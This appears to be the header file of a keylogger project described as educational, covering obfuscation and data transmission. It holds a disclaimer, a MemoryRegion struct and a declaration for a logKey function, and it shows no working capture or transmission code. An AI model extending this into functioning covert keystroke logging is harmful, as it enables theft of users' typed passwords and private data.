/*
 * ObfuscatedKeylogger.cpp
 * Author: Alex Zevnoski (Leshenka)
 * Copyright (c) 2024 Alex Zevnoski (Leshenka)
 *
 * This file is part of the ObfuscatedKeylogger project, an educational
 * and experimental project demonstrating obfuscation and data transmission techniques.
 *
 * DISCLAIMER: This software is intended solely for educational purposes.
 * The author does not condone or support illegal or unethical use of this software.
 */

#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <Windows.h>

typedef struct {
	char* baseAddress;
	size_t size;
	size_t used;
} MemoryRegion;

int logKey(int _key, MemoryRegion* memRegion);
#endif
